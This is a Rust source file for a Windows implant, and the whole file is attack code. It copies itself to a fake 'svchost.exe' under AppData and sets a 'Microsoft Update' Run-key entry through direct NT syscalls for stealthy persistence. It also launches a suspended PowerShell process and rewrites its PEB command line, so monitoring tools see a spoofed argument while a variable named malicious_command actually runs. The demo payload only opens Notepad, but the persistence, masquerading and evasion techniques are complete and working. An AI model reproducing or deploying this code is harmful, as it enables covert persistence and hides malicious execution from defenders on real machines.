#![allow(non_snake_case)]
#![allow(unused_unsafe)]
mod syscalls;
use crate::syscalls::SYSCALLS;
use std::mem::{size_of, zeroed};
use std::ptr::{null_mut, self};
use std::ffi::{c_void, OsString, OsStr};
use std::os::windows::ffi::{OsStringExt, OsStrExt};
use std::iter::once;
use std::env;
use std::fs;
use std::io::Write;
use std::path::Path;
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
#[cfg(target_pointer_width = "64")]
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
#[cfg(target_pointer_width = "32")]
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
use windows_sys::Win32::System::Threading::{
    CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW, PEB, PROCESS_BASIC_INFORMATION,
    PROCESS_INFORMATION_CLASS, CREATE_NEW_CONSOLE, CREATE_SUSPENDED, GetCurrentProcess, OpenProcessToken
};
use windows_sys::Win32::Security::{GetTokenInformation, TOKEN_USER, TOKEN_QUERY};
use windows_sys::Win32::Security::Authorization::ConvertSidToStringSidW;
use windows_sys::Win32::Foundation::{UNICODE_STRING, NTSTATUS, HANDLE};
use windows_sys::Win32::System::Memory::LocalFree;
use windows_sys::Win32::System::WindowsProgramming::OBJECT_ATTRIBUTES;
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
mod power;
use power::run_all_checks;

fn to_wide_chars(s: &str) -> Vec<u16> {
    s.encode_utf16().collect()
}
fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
    let mut wide = to_wide_chars(s);
    if wide.len() < total_width {
        wide.resize(total_width, padding_char);
    }
    wide
}

fn main() {
    let startup_result: Result<(), std::io::Error> = (|| {
        // Persist executable to disk
        let appdata_path = env::var("APPDATA").map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
        let persist_dir = Path::new(&appdata_path).join("Microsoft");
        fs::create_dir_all(&persist_dir)?;
        let persist_path = persist_dir.join("svchost.exe");

        let base_address = unsafe { GetModuleHandleA(ptr::null()) } as *const u8;
        if base_address.is_null() {
            return Err(std::io::Error::last_os_error());
        }

        // Inlined get_image_size logic
        let image_size = unsafe {
            let dos_header = base_address as *const IMAGE_DOS_HEADER;
            if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
                None
            } else {
                let nt_headers_ptr = base_address.add((*dos_header).e_lfanew as usize);
                #[cfg(target_pointer_width = "64")]
                {
                    let nt_headers = nt_headers_ptr as *const IMAGE_NT_HEADERS64;
                    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
                        None
                    } else {
                        Some((*nt_headers).OptionalHeader.SizeOfImage as usize)
                    }
                }
                #[cfg(target_pointer_width = "32")]
                {
                    let nt_headers = nt_headers_ptr as *const IMAGE_NT_HEADERS32;
                    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
                        None
                    } else {
                        Some((*nt_headers).OptionalHeader.SizeOfImage as usize)
                    }
                }
            }
        }.ok_or_else(|| std::io::Error::new(std::io::ErrorKind::InvalidData, "Failed to get image size"))?;

        let image_bytes = unsafe { std::slice::from_raw_parts(base_address, image_size) };
        let mut file = fs::File::create(&persist_path)?;
        file.write_all(image_bytes)?;

        // Inlined get_user_sid_string logic
        let user_sid = (|| -> Result<String, std::io::Error> {
            let mut token_handle: HANDLE = 0;
            if unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle) } == 0 {
                return Err(std::io::Error::last_os_error());
            }
            let mut return_length: u32 = 0;
            unsafe { GetTokenInformation(token_handle, 1, ptr::null_mut(), 0, &mut return_length) };
            if return_length == 0 {
                return Err(std::io::Error::last_os_error());
            }
            let mut token_user_buffer: Vec<u8> = vec![0; return_length as usize];
            if unsafe { GetTokenInformation(token_handle, 1, token_user_buffer.as_mut_ptr() as *mut _, return_length, &mut return_length) } == 0 {
                return Err(std::io::Error::last_os_error());
            }
            let token_user = token_user_buffer.as_ptr() as *const TOKEN_USER;
            let sid = unsafe { (*token_user).User.Sid };
            let mut sid_string_ptr: *mut u16 = ptr::null_mut();
            if unsafe { ConvertSidToStringSidW(sid, &mut sid_string_ptr) } == 0 {
                return Err(std::io::Error::last_os_error());
            }
            let sid_string = unsafe {
                let len = (0..).take_while(|&i| *sid_string_ptr.offset(i) != 0).count();
                let slice = std::slice::from_raw_parts(sid_string_ptr, len);
                OsString::from_wide(slice).to_string_lossy().into_owned()
            };
            unsafe { LocalFree(sid_string_ptr as isize) };
            Ok(sid_string)
        })()?;

        // Create registry key using direct syscalls
        let key_path = format!("\\Registry\\User\\{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", user_sid);
        let wide_key_path: Vec<u16> = OsStr::new(&key_path).encode_wide().chain(once(0)).collect();
        let mut key_path_unicode = UNICODE_STRING {
            Length: ((wide_key_path.len() - 1) * 2) as u16,
            MaximumLength: (wide_key_path.len() * 2) as u16,
            Buffer: wide_key_path.as_ptr() as *mut _,
        };

        let mut key_handle: HANDLE = 0;
        let mut object_attributes = OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: 0,
            ObjectName: &mut key_path_unicode,
            Attributes: 0x00000040, // OBJ_CASE_INSENSITIVE
            SecurityDescriptor: ptr::null_mut(),
            SecurityQualityOfService: ptr::null_mut(),
        };

        let mut disposition: u32 = 0;
        let status: NTSTATUS = unsafe {
            (SYSCALLS.NtCreateKey)(
                &mut key_handle,
                0x00020006, // KEY_SET_VALUE
                &mut object_attributes,
                0,
                ptr::null_mut(),
                0, // REG_OPTION_NON_VOLATILE
                &mut disposition,
            )
        };

        if status != 0 {
            return Err(std::io::Error::from_raw_os_error(status as i32));
        }

        let value_name = "Microsoft Update";
        let wide_value_name: Vec<u16> = OsStr::new(value_name).encode_wide().chain(once(0)).collect();
        let mut value_name_unicode = UNICODE_STRING {
            Length: ((wide_value_name.len() - 1) * 2) as u16,
            MaximumLength: (wide_value_name.len() * 2) as u16,
            Buffer: wide_value_name.as_ptr() as *mut _,
        };

        let wide_persist_path: Vec<u16> = persist_path.as_os_str().encode_wide().chain(once(0)).collect();
        let status = unsafe {
            (SYSCALLS.NtSetValueKey)(
                key_handle,
                &mut value_name_unicode,
                0,
                1, // REG_SZ
                wide_persist_path.as_ptr() as *mut _,
                (wide_persist_path.len() * 2) as u32,
            )
        };

        unsafe { (SYSCALLS.NtClose)(key_handle as *mut _) };

        if status != 0 {
            return Err(std::io::Error::from_raw_os_error(status as i32));
        }

        Ok(())
    })();

    if let Err(e) = startup_result {
        println!("Failed to add to startup: {}", e);
    }
    if power::run_all_checks() {
        println!("ikinci de calisti vay anasini");
    }
    let malicious_command = r#"powershell.exe -ExecutionPolicy Bypass -Command "notepad""#;
    let malicious_command_wide = to_wide_chars(&malicious_command);

    let spoofed_command_str = "powershell.exe";
    let mut spoofed_command_wide = pad_right(spoofed_command_str, malicious_command.len(), ' ' as u16);
    spoofed_command_wide.push(0);

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as u32;
    let mut sa: SECURITY_ATTRIBUTES = unsafe { zeroed() };
    sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let mut current_dir = to_wide_chars("C:\\windows\\");
    current_dir.push(0);

    let success = unsafe {
        CreateProcessW(
            null_mut(),
            spoofed_command_wide.as_mut_ptr(),
            &mut sa,
            &mut sa,
            0,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            null_mut(),
            current_dir.as_ptr(),
            &mut si,
            &mut pi,
        )
    };
	
    if success == 0 {
        return;
    }
	
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    let mut return_length: u32 = 0;

    let status: NTSTATUS =
        (SYSCALLS.NtQueryInformationProcess)(
            pi.hProcess as *mut c_void,
            0 as PROCESS_INFORMATION_CLASS,
            &mut pbi as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length
        );

    if status != 0 {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    let mut peb: PEB = unsafe { zeroed() };
    let mut bytes_read: usize = 0;

    let status = unsafe {
        (SYSCALLS.NtReadVirtualMemory)(
            pi.hProcess as *mut c_void,
            pbi.PebBaseAddress as *mut c_void,
            &mut peb as *mut _ as *mut c_void,
            size_of::<PEB>(),
            &mut bytes_read
        )
    };

    if status != 0 || bytes_read != size_of::<PEB>() {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    #[repr(C)]
    struct Params {
        _filler: [u8; 0x70],
        CommandLine: UNICODE_STRING,
    }
    let mut proc_params: Params = unsafe { zeroed() };
    let status = unsafe {
        (SYSCALLS.NtReadVirtualMemory)(
            pi.hProcess as *mut c_void,
            peb.ProcessParameters as *mut c_void,
            &mut proc_params as *mut _ as *mut c_void,
            size_of::<Params>(),
            &mut bytes_read
        )
    };

    if status != 0 || bytes_read != size_of::<Params>() {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    let mut bytes_written: usize = 0;
    let status = unsafe {
        (SYSCALLS.NtWriteVirtualMemory)(
            pi.hProcess as *mut c_void,
            proc_params.CommandLine.Buffer as *mut c_void,
            malicious_command_wide.as_ptr() as *mut c_void,
            malicious_command_wide.len() * 2,
            &mut bytes_written
        )
    };

    if status != 0 {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    let cmd_line_len = (spoofed_command_str.len() * 2) as u16;

    let status = unsafe {
        let len_address = (peb.ProcessParameters as *mut u8).add(0x70);
        (SYSCALLS.NtWriteVirtualMemory)(
            pi.hProcess as *mut c_void,
            len_address as *mut c_void,
            &cmd_line_len as *const _ as *mut c_void,
            size_of::<u16>(),
            &mut bytes_written
        )
    };

    if status != 0 {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    unsafe {
        let mut suspend_count: u32 = 0;
        let _ = (SYSCALLS.NtResumeThread)(pi.hThread as *mut c_void, &mut suspend_count);
        let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
        let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
    }
}
